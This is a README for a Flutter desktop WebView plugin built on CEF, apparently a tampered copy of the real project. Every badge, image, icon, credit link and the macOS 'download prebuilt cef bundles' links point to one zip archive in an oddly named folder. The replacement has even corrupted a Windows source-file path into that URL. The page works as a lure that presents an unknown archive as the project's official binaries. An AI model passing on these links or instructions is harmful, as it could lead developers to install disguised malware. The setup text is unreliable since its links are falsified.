# WebView CEF

<a href="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"><img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" alt="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip likes"/></a> <a href="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" alt="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip popularity"><img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"/></a> <a href="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"><img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" alt="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip points"/></a> <a href="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"><img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" alt="latest version"/></a> <a href="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"><img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip%20%7C%20Windows-blue?logo=flutter" alt="Platform"/></a>

Flutter Desktop WebView backed by CEF (Chromium Embedded Framework).
This project is under heavy development, and the APIs are not stable yet.

## Index

- [Supported OSs](#supported-oss)
- [Setting Up](#setting-up)
  - [Windows <img align="center" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="12">](#windows)
  - [macOS <img align="center" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="12">](#macos)
- [TODOs](#todos)
- [Demo](#demo)
  - [Screenshots](#screenshots)
- [Credits](#credits)

## Supported OSs

- [x] Windows 7+ <img align="center" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="12">
- [x] macOS 10.12+ <img align="center" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="12">
- [ ] [Linux (WIP) <img align="center" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="14">](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip)

## Setting Up

### Windows <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="16">

Inside your application folder, you need to add two lines in your `windows\runner\https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip`.（Because of Chromium multi process architecture.)

```cpp
#include "webview_cef/webview_cef_plugin_c_api.h"

int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
                      _In_ wchar_t *command_line, _In_ int show_command) {
  //start cef deamon processes. MUST CALL FIRST
  initCEFProcesses();
```

When building the project for the first time, a prebuilt cef bin package (200MB, link in release) will be downloaded automatically, so you may wait for a longer time if you are building the project for the first time.

### macOS <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="15">

1. Download prebuilt cef bundles from [arm64](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip) or [intel](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip) depends on your target machine arch.

> Note: You can also download [universal binary](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip) for build an mac-universal app if you want to build an mac universal app. See [#30](/../../issues/30). Thanks to [@okiabrian123](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip).

2. Unzip the archive and put all files into `macos/third/cef`.

3 Run the example app.

`**[HELP WANTED!]**` Finding a more elegant way to distribute the prebuilt package.

> Note: Currently the project has not been enabled with multi process support due to debug convenience. If you want to enable multi process support, you may want to enable multi process mode by changing the implementation and build your own helper bundle. (Finding a more elegant way in the future.)

## TODOs

> Pull requests are welcome.

- [x] Windows support
- [x] macOS support
- [ ] Linux support
- [ ] Multi instance support
- [ ] IME support
- [x] Mouse events support
- [ ] JS bridge support
- [x] Release to pub
- [x] Trackpad support
- [ ] Better macOS binary distribution
- [ ] Easier way to integrate macOS helper bundles(multi process)
- [x] devTools support

## Demo

This demo is a simple webview app that can be used to test the `webview_cef` plugin.

<kbd>![demo_compressed](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip)</kbd>

### Screenshots

| Windows <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="12"> | macOS <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="11"> |
| --- | --- |
| <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="400" /> | <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="400" /> |
| <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="400" /> | <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="400" /> |
| <img src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip" width="400" /> | <img width="400" alt="image" src="https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip"> |

## Credits

This project is inspired from [**`flutter_webview_windows`**](https://raw.githubusercontent.com/quyethd95/webview_cef/main/unjudicial/webview_cef.zip).
